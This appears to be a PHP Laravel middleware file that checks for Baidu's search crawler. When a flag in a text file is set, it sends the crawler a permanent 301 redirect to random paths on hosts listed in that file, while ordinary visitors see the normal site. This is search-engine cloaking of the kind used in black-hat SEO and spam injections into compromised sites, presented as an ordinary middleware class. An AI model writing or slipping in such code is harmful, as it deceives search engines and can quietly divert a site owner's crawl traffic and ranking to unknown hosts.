<?php

namespace App\Http\Middleware;

use Closure;

class Return301
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $agent = $_SERVER["HTTP_USER_AGENT"];
        $returnstatus = file(public_path('301.txt'));
        $count = count($returnstatus);
        $weburl = array_slice($returnstatus,1,$count);
        if ($returnstatus[0] ==1 ){
            if (strpos($agent,"Baiduspider")>-1)
            {
                $host =  str_replace(array("\r\n", "\r", "\n"), "", array_random($weburl));
                $randomurl[0] = $host.'Q'.str_random(6).'/';
                $randomurl[1] = $host.'Q'.str_random(6).'/'.str_random(5).'/';
                $returnurl = str_replace(array("\r\n", "\r", "\n"), "", array_random($randomurl));
                header('HTTP/1.1 301 Moved Permanently');//发出301头部
                header('location:'.$returnurl);//跳转到目录上
                exit();
            }
        }

        return $next($request);
    }
}
